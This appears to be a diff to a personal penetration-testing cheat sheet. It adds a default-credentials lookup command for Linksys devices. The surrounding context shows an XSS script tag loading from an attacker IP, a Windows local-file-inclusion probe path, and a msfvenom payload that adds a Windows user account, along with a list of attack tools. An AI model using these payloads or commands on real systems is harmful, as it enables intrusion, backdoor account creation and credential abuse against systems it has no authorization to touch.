@@ -43,6 +43,10 @@ export PATH=.:$PATH
   ```
   <script src="http://10.10.14.7"></script>
   ```
+## Default creds
+  ```
+  creds search linksys
+  ```
 ## windows lfi
   ```
   /windows/system32/license.rtf
@@ -273,6 +277,7 @@ msfvenom -a x86 --platform Windows -p windows/exec CMD="net user /add lopsy a123
   krbrelayx
   gdb-peda-pwndbg-gef
   ```
+
 
 
 
